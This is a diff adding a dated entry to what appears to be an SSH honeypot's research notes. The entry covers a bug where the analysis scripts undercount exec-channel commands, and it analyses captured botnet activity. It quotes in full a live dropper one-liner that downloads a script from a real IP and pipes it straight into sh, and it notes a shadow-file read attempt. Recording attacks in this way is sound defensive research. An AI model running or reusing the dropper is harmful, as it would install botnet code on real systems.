@@ -413,6 +413,43 @@ partially accumulated), full exchange completed.
 
 ---
 
+### exec channel blind spot + live dropper (2026-05-29)
+
+**Bug found: report.py and periods.py both undercount commands.**
+
+session.log has two msg types with a `command` field:
+- `"shell"` -- interactive shell (bot typed commands)
+- `"exec"` -- one-shot SSH exec (bot ran `ssh host cmd` without opening a shell)
+- `"channel request"` -- logged again in logRequest() before dispatch, so every exec command appears twice
+
+report.py and periods.py only count `msg == "shell"`. This is why period 8 showed "0 commands" and the overall report showed "10 commands" -- it was missing 679 exec-channel commands entirely. Real count on 2026-05-29: 44 unique commands, 92 log entries.
+
+**Root cause in code:** `logRequest()` logs the command as `"channel request"`, then `runExec()` logs it again as `"exec"`. Fix: pick one, or filter in analysis scripts to avoid double-count.
+
+**Fix needed:** report.py and periods.py should count `msg == "exec"` OR `msg == "shell"`, not just shell. Dedup by (sid, command) to avoid double-count from channel request.
+
+---
+
+**Live dropper seen today (2026-05-29, threshold=1):**
+
+```
+uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; (wget --no-check-certificate -qO- https://14.46.136.77/sh || curl -sk https://14.46.136.77/sh) | sh -s ssh
+```
+
+- hex = "auth_ok\n" -- C2 beacon, signals to controller that auth succeeded
+- downloads and pipes `14.46.136.77/sh` directly into sh (no file written to disk)
+- `-s ssh` tells the script the entry vector
+- came in via exec channel (not interactive shell) -- invisible to old analysis
+- hit 4+ times today from different IPs, same payload, same C2 -- botnet spray
+
+**VPS assessment bot (sid e1877e76, 2026-05-29 09:48):**
+
+35 commands in one session: package managers (apt/yum/pacman/zypper), shadow file read attempt, disk speed (dd), network config, systemd services, connectivity check (ping 8.8.8.8). Infrastructure scout, picking candidates for mining deployment.
+
+**Why bursty:** periods 5-7 had 0 commands in the analysis because exec-channel commands weren't counted. Real data shows activity was continuous, just invisible. The "command drought" was a lie from a broken script.
+
+---
+
 ### auth-threshold flag + analysis period tooling
 
 **Picked:**
